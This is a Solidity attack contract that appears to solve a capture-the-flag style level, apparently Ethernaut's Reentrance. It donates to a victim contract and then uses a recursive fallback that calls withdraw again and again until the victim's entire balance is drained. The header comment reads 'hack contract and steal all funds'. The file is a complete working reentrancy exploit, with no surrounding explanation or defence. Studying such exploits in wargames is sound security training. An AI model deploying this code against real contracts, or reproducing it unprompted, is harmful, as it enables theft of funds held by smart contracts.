// SPDX-License-Identifier: MIT
// Locked pragma
pragma solidity 0.8.0;

// Victim contract
import './Reentrance.sol';

/// @title Attack contract, hack contract and steal all funds!
/// @author Web3 Blockchain Developer
contract ReentrancyAttack {
    /// @notice State variable of value type, assigned in constructor.
    Reentrance target;
    /** @notice Public state variable of integer value type, assigned to 
    target.donate and target.withdraw inherited from victim contract and determines
    the amount to donate or withdraw. */
    uint public amount = 1000000000000000 wei;

    /// @notice Player will specify the victim contract address and assign it as target.
    constructor(address payable _targetAddr) payable {
        target = Reentrance(_targetAddr);
    }

    /** @notice Player will donate a specific amount to the victim contract in 
    order to pass the if statement in the victim contracts withdraw function. */
    function donateToTarget() public {
        target.donate{value: amount, gas: 3000000}(address(this));
    }

    /** @notice Player will use this recursive fallback function to attack the victim contract
    and exploit the vulnerable withdraw function. If the target address still has a balance
    the attack will continue until all funds have been stolen to complete this level! */
    fallback() external payable {
        if (address(target).balance != 0 ) {
            target.withdraw(amount);
        }
    }
}